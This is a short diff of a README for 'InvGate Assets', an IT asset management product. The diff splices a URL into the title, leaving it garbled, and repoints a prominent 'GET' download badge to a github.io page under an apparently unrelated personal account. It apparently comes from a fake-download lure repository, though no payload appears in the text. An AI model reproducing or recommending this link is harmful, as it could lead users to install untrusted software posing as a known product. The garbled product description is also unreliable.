@@ -1,8 +1,8 @@
-# InvGate Assets – IT Asset Management and Inventory Platform
+# InvGate Assets – IT Asset https://github.com/InvGate-Assets-IT-Asset-ManagementManagement and Inventory Platform
 
 > **Description:** InvGate Assets streamlines IT asset discovery, inventory management, hardware tracking, software auditing, license visibility, and lifecycle monitoring, helping organizations maintain complete infrastructure records and centralized asset management across enterprise environments.
 
-[![GET — INVGATE ASSETS](https://img.shields.io/badge/GET-INVGATE%20ASSETS-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/)
+[![GET — INVGATE ASSETS](https://img.shields.io/badge/GET-INVGATE%20ASSETS-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/InvGate-Assets)
 
 ---
 
